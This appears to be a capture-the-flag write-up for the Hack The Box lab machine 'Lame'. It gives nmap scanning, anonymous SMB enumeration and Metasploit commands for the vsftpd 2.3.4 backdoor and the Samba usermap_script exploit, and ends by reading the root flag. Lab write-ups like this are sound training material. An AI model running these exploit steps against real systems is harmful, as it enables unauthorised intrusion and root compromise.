# Lame

## Port Scanning

```bash
nmap -T4 -sV -p- --min-rate 1000 --open -oN port_scan.txt 10.10.10.3

Nmap scan report for 10.10.10.3
Host is up (0.034s latency).
Not shown: 65529 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```



## SMB Enumeration

First things first we can try to access via SMB as Anonymous

```bash
smbclient -L 10.10.10.3 -N
```

<figure><img src="../../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

There is a juicy dir, let's go in.

```bash
smbclient -N //10.10.10.3/tmp
```

<figure><img src="../../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>

## vsftp 2.3.4 Exploit

I've notice that the version of the vsftp installed is vulnerable to a Backdoor Command Execution exploit.

Start metasploit and run the exploit

<pre class="language-bash" data-title="Metasploit module"><code class="lang-bash">service postgresql start &#x26;&#x26; msfconsole
<strong>
</strong><strong>use exploit/unix/ftp/vsftpd_234_backdoor
</strong>set RHOSTS 10.10.10.3

exploit
</code></pre>

And we got a Meterpreter session.

## Samba 3.0.20 Username map script exploit

There is a vulnerability in this version of samba that allow us to execute commands.

{% code title="Metasploit module" %}
```bash
service postgresql start && msfconsole

use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3

run
```
{% endcode %}

### User.flag

Print the user flag.

```bash
cat /home/makis/user.txt
```

### Root.flag

Print the root flag.

```bash
cat /root/root.txt
```
